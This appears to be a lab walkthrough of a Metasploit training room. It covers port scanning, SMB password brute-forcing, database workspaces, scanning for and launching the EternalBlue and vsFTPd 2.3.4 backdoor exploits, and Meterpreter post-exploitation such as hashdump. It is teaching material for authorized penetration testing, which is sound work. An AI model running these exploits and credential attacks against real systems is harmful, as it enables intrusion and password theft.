This is an excellent room because it teaches the **real Metasploit workflow** used during authorized penetration tests. Below are detailed explanations with **every important command**, **what it does**, **why you use it**, and **when to use it**.

---

# Metasploit Workflow

```
Recon
   ↓
Port Scan
   ↓
Service Enumeration
   ↓
Store Results in Database
   ↓
Vulnerability Scanning
   ↓
Exploitation
   ↓
Post Exploitation
```

---

# 1. Finding Port Scanners

Instead of immediately using Nmap, Metasploit has built-in scanners.

### Search for scanners

```bash
search portscan
```

### Explanation

Searches Metasploit's module database for every module containing **portscan**.

Example output

```
auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/syn
auxiliary/scanner/portscan/ack
```

---

# 2. Load a Scanner

```bash
use auxiliary/scanner/portscan/tcp
```

### Explanation

Loads the TCP Connect Scanner.

Think of it as:

```
Metasploit
    ↓
Load Tool
    ↓
Configure Tool
    ↓
Run Tool
```

After loading you'll see

```
msf6 auxiliary(scanner/portscan/tcp) >
```

---

# 3. View Required Options

```bash
show options
```

### Explanation

Shows every configurable parameter.

Example

```
RHOSTS
PORTS
THREADS
TIMEOUT
```

Never run a module before checking its options.

---

# 4. Set Target

```bash
set RHOSTS 10.10.10.20
```

or

```bash
set RHOSTS MACHINE_IP
```

### Explanation

Specifies the target machine.

Without RHOSTS Metasploit has nothing to attack.

---

# 5. Select Ports

Example

```bash
set PORTS 1-1024
```

Only scans well-known ports.

---

Scan common ports plus RDP

```bash
set PORTS 1-1024,3389
```

---

Custom list

```bash
set PORTS 22,80,443,8080
```

---

# 6. Increase Speed

```bash
set THREADS 10
```

### Explanation

Threads = how many simultaneous scans.

```
THREADS 1
```

```
Port 1
Port 2
Port 3
```

Slow.

---

```
THREADS 10
```

```
Port1 Port2 Port3 Port4 Port5
```

Much faster.

---

# 7. Run the Scan

```bash
run
```

or

```bash
exploit
```

For auxiliary modules, `run` is the preferred command.

---

Output

```
135 OPEN
445 OPEN
3389 OPEN
8000 OPEN
```

---

# 8. Run Nmap from Inside Metasploit

Instead of leaving Metasploit

```bash
nmap -sV -O 10.10.10.20
```

### What it does

Runs Nmap directly.

Flags:

```
-sV
```

Version detection

```
Apache 2.4
OpenSSH 8.2
vsFTPD 2.3.4
```

---

```
-O
```

OS Detection

Example

```
Windows Server 2008
Ubuntu
```

---

# 9. NetBIOS Scanner

Search

```bash
search netbios
```

Load

```bash
use auxiliary/scanner/netbios/nbname
```

Target

```bash
set RHOSTS MACHINE_IP
```

Run

```bash
run
```

### Finds

* Computer Name
* Workgroup
* Domain
* MAC Address

Example

```
STRATFORD-WS01
```

---

# 10. HTTP Version Scanner

Load

```bash
use auxiliary/scanner/http/http_version
```

Target

```bash
set RHOSTS MACHINE_IP
```

Port

```bash
set RPORT 8000
```

Run

```bash
run
```

Output

```
webfs/1.21
```

Now you know exactly which software is running.

---

# 11. SMB Login Scanner

Load

```bash
use auxiliary/scanner/smb/smb_login
```

Specify user

```bash
set SMBUSER penny
```

Password list

```bash
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
```

Quiet mode

```bash
set VERBOSE false
```

Run

```bash
run
```

If successful

```
Success

penny:leo1234
```

This confirms valid credentials.

---

# 12. Setting Up the Database

Initialize (Kali)

```bash
sudo msfdb init
```

Starts PostgreSQL and creates the Metasploit database.

---

Check status

```bash
db_status
```

Output

```
Connected to msf
```

---

# 13. Workspaces

View workspaces

```bash
workspace
```

Create one

```bash
workspace -a stratford
```

Switch

```bash
workspace stratford
```

Delete

```bash
workspace -d stratford
```

Think of workspaces as separate projects so scans, hosts, and credentials don't get mixed together.

---

# 14. Scan Into Database

Instead of

```bash
nmap
```

use

```bash
db_nmap -sV -O 10.10.10.20
```

### Difference

```
nmap
```

Displays results only.

```
db_nmap
```

Displays **and saves** results to the Metasploit database.

---

# 15. Show Stored Hosts

```bash
hosts
```

Lists every discovered machine.

---

# 16. Show Services

```bash
services
```

Shows

```
IP
Port
Protocol
Service
Version
```

---

Filter by service

```bash
services -S smb
```

or

```bash
services -S ftp
```

---

# 17. Stored Credentials

```bash
creds
```

Shows credentials discovered during scans.

Example

```
penny
leo1234
```

---

# 18. Automatically Set Targets

Instead of typing IPs

```bash
hosts -R
```

Automatically fills

```
RHOSTS
```

with every discovered host.

---

Only FTP machines

```bash
services -S ftp -R
```

Only SMB machines

```bash
services -S smb -R
```

This is a huge time saver on larger engagements.

---

# 19. Import External Nmap Scans

```bash
db_import scan.xml
```

Imports an existing Nmap XML scan into the database.

---

# 20. Search for Vulnerability Scanners

Example

```bash
search smb_ms17_010
```

or

```bash
search ftp
```

or

```bash
search type:auxiliary smb
```

---

# 21. Scan for EternalBlue

Load

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Target

```bash
set RHOSTS MACHINE_IP
```

Run

```bash
run
```

Output

```
Host is likely VULNERABLE
```

This scanner only checks for the vulnerability; it does not exploit it.

---

# 22. View Recorded Vulnerabilities

```bash
vulns
```

Shows findings such as

```
MS17-010

CVE-2017-0144
```

that have been stored in the database.

---

# 23. Anonymous FTP Check

Load

```bash
use auxiliary/scanner/ftp/anonymous
```

Populate FTP targets from the database

```bash
services -S ftp -R
```

Run

```bash
run
```

Checks whether anonymous FTP login is allowed.

---

# 24. Search for Exploits

Example

```bash
search eternalblue
```

or

```bash
search vsftpd
```

Lists available exploit modules.

---

# 25. Load an Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Metasploit automatically selects a default payload, often a Meterpreter reverse shell for Windows.

---

# 26. Check Exploit Options

```bash
show options
```

Verify required settings such as:

* `RHOSTS` (target)
* `LHOST` (your listener IP)
* `LPORT` (listening port)

---

# 27. Launch the Exploit

```bash
exploit
```

or

```bash
run
```

A successful exploit typically opens a session, such as a Meterpreter session on Windows or a command shell on Unix.

---

# 28. Meterpreter Basics (Windows)

Show current user:

```bash
getuid
```

Search for a file:

```bash
search -f flag.txt
```

Read a file:

```bash
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

Dump local password hashes (when appropriate privileges exist):

```bash
hashdump
```

Background the session:

```bash
background
```

---

# 29. Managing Sessions

List active sessions:

```bash
sessions
```

Interact with session 1:

```bash
sessions -i 1
```

Terminate all sessions:

```bash
sessions -K
```

---

# 30. vsFTPd 2.3.4 Backdoor Exploit

Search:

```bash
search vsftpd
```

Load:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Set the target:

```bash
set RHOSTS MACHINE_IP
```

Run:

```bash
exploit
```

This exploit targets the well-known backdoored release of vsFTPd 2.3.4. On a vulnerable lab machine, it provides a simple Unix command shell.

Basic verification commands in the shell:

```bash
id
```

Shows the current user ID and groups.

```bash
whoami
```

Displays the current username.

```bash
hostname
```

Displays the target system's hostname.

---

# Quick Command Cheat Sheet

| Purpose               | Command               |
| --------------------- | --------------------- |
| Search modules        | `search <keyword>`    |
| Load module           | `use <module>`        |
| View options          | `show options`        |
| Set target            | `set RHOSTS <IP>`     |
| Set local listener    | `set LHOST <your_IP>` |
| Execute module        | `run` / `exploit`     |
| Run Nmap              | `nmap -sV -O <IP>`    |
| Save Nmap to DB       | `db_nmap -sV -O <IP>` |
| Show hosts            | `hosts`               |
| Show services         | `services`            |
| Show credentials      | `creds`               |
| Show vulnerabilities  | `vulns`               |
| List sessions         | `sessions`            |
| Interact with session | `sessions -i <id>`    |
| Background session    | `background`          |
| End all sessions      | `sessions -K`         |

**Key takeaway:** Think of Metasploit as a workflow rather than a collection of individual commands. In most engagements, you'll repeatedly follow the same pattern: **search → use → show options → set → run/exploit → interact with sessions**. Once that workflow becomes familiar, learning new modules is much easier.
